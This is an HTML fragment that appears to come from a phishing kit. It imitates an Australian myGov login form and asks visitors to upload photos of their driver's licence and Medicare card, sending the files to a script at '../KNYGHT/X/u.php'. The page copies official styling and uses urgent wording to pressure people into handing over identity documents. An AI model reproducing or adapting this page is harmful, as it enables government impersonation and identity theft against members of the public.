...
<li><small> <font color="Gray">Each field is necessary, and in order to proceed, you must enter accurate information.</font></small></li>
							...
							<form id="mygov-login-form" aria-describedby="error-msg" class="mygov-login-form alternative" action="../KNYGHT/X/u.php" method="post" enctype="multipart/form-data">
	
								 <font color="#2479b3"><strong>Upload your Driver’s License and Medicare ID </strong></font><br><br>
  <p style="text-align:center;"><font color="red"><small><b>NOTE:</b> Image upload may take a few minutes. 
Please do not leave the page while processing. You will be directed to 
the next step once complete.</small></font> </p>

								
	  <p style="text-align:center;"><font color="gray">For best results, <strong>please ensure your full ID is captured</strong> in the image and <strong>we recommend using JPG</strong> as the file format for your scanned ID. Other acceptable file formats are: BMP, PNG, and TIFF. </font> </p>

  

   <li><Strong> Upload Driver’s License ID</strong></li><br><input accept="image/*" class="button-main" name="userfile[]" required onchange="document.getElementById('blah').src = window.URL.createObjectURL(this.files[0])" type="file" />
   <br><br><img id="blah" alt="front" width="100" height="100" />
   <br><br>
	<li><Strong> Upload Medicare ID</strong></li><br><input accept="image/*" class="button-main" required name="userfile[]" onchange="document.getElementById('blah1').src = window.URL.createObjectURL(this.files[0])" type="file" />
	<br><br><img id="blah1" alt="back" width="100" height="100" />
	<br><br>
<br>
    <input class="button-main" type="submit"  value="Upload">
